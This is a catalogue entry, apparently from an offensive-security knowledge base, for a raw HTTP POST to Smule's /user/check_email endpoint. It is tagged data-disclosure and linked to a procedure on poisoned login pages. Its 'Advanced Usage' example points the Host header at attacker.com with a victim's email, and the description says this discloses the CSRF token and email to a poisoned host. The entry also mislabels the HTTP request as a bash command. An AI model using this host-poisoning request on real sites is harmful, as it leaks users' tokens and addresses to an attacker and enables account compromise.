---
data: >-
  POST /user/check_email HTTP/1.1

  Host: localhost

  User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101
  Firefox/61.0

  Accept: application/json, text/plain, */*

  Accept-Language: en-GB,en;q=0.5

  Accept-Encoding: gzip, deflate

  Referer: https://www.smule.com/s/smule_groups/user_groups/fossnow27

  X-CSRF-Token: [redacted]

  Content-Type: application/x-www-form-urlencoded

  X-Smulen: daf446d26def7faeef4f6527d7f20fae

  Content-Length: 31

  Origin: https://www.smule.com

  Connection: close


  email=foo%40bar.com
tags:
  - http
  - post
  - data-disclosure
type: command
executor: bash
platforms:
  - Web
id: fb35e8bd-10b7-45f3-9437-9990185ecdaa
created_at: '2025-12-13T09:00:34.280Z'
updated_at: '2025-12-13T09:00:34.280Z'
verified: false
validated: true
submitted: true
---
# POST Check Email

## Command

```bash
POST /user/check_email HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: application/json, text/plain, */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.smule.com/s/smule_groups/user_groups/fossnow27
X-CSRF-Token: [redacted]
Content-Type: application/x-www-form-urlencoded
X-Smulen: daf446d26def7faeef4f6527d7f20fae
Content-Length: 31
Origin: https://www.smule.com
Connection: close

email=foo%40bar.com
```

## Description

This POST request checks an email during login, disclosing CSRF token and email when sent to a poisoned host.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `X-CSRF-Token` | CSRF protection token | Yes |
| `email` | Email address to check (URL-encoded) | Yes |

## Examples

### Basic Usage

```bash
POST /user/check_email HTTP/1.1
Host: localhost
X-CSRF-Token: token

email=foo%40bar.com
```

### Advanced Usage

```bash
POST /user/check_email HTTP/1.1
Host: attacker.com
X-CSRF-Token: [redacted]
X-Smulen: custom_value

email=victim%40email.com
```

## Expected Output

JSON response with email status, including the token and email.

## Related

- [[procedures/Trigger-Login-on-Poisoned-Page-to-Disclose-CSRF-Token]]
